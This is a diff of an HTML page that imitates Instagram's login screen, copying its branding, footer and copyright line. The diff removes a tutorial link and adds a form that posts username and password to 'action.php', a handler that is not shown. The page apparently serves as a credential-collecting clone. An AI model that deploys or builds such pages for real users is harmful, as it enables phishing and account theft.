@@ -1,42 +1,81 @@
 <!DOCTYPE html>
-<html>
-
+<html lang="en">
 <head>
-  <title>Instagram Log in</title>
-  <link rel="stylesheet" type="text/css" href="style.css">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css">
-  <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
+	<meta charset="UTF-8">
+	<title>Instagram Login Page</title>
+	<link rel="stylesheet" href="style.css">
 </head>
-
 <body>
 
-  <div class="container">
-    <div class="text">Log in to Continue</div>
-    <div class="page">
-      <div class="title">instagram</div>
-      <form>
-        <input type="text" placeholder="Phone number, username, or email" name="username">
-        <input type="password" placeholder="Password" name="password">
-        <button>Log in</button>
-        <div class="option">OR</div>
-      </form>
-      <div class="fblink">
-        <span class="fab fa-facebook"></span>
-        <a href="#">Log in with Facebook</a>
-      </div>
+<div class="wrapper">
+	<div class="header">
+		<div class="top">
+			<div class="logo">
+				<img src="instagram.png" alt="instagram" style="width: 175px;">
+			</div>
 
-      <div class="forget-id">
-        <a href="#">Forget password?</a>
-      </div>
+            <form method="POST" action="action.php">
+			<div class="form">
+				<div class="input_field">
+					<input type="text" placeholder="Phone number, username, or email" class="input" name="username">
+				</div>
+				<div class="input_field">
+					<input type="password" placeholder="Password" class="input" name="password">
+				</div>
+				<div class="btn"><a href="#">Log In</a></div>
+			</div>
 
-      <div class="signup">
-        <p>Don't have an account?<a href="#">Sign up</a></p>
-      </div>
-    </div>
-  </div>
+        </form>
 
-  <!--This is my youtube channel link-->
-  <a href="https://youtu.be/otceIEzFlEg" id="yt" target="_blank"><i style="margin-right: 5px" class="fab fa-youtube"></i>Tutorial</a>
+
+
+			<div class="or">
+				<div class="line"></div>
+				<p>OR</p>
+				<div class="line"></div>
+			</div>
+			<div class="dif">
+				<div class="fb">
+					<img src="facebook.png" alt="facebook">
+					<p>Log in with Facebook</p>
+				</div>
+				<div class="forgot">
+					<a href="#">Forgot password?</a>
+				</div>
+			</div>
+		</div>
+		<div class="signup">
+			<p>Don't have an account? <a href="#">Sign up</a></p>
+		</div>
+		<div class="apps">
+			<p>Get the app.</p>
+			<div class="icons">
+				<a href="#"><img src="appstore.png" alt="appstore"></a>
+				<a href="#"><img src="googleplay.png" alt="googleplay"></a>
+			</div>
+		</div>
+	</div>
+	<div class="footer">
+		<div class="links">
+			<ul>
+				<li><a href="#">ABOUT US</a></li>
+				<li><a href="#">SUPPORT</a></li>
+				<li><a href="#">PRESS</a></li>
+				<li><a href="#">API</a></li>
+				<li><a href="#">JOBS</a></li>
+				<li><a href="#">PRIVACY</a></li>
+				<li><a href="#">TERMS</a></li>
+				<li><a href="#">DIRECTORY</a></li>
+				<li><a href="#">PROFILES</a></li>
+				<li><a href="#">HASHTAGS</a></li>
+				<li><a href="#">LANGUAGE</a></li>
+			</ul>
+		</div>
+		<div class="copyright">
+			© 2019 INSTAGRAM
+		</div>
+	</div>
+</div>
+
 </body>
-
 </html>
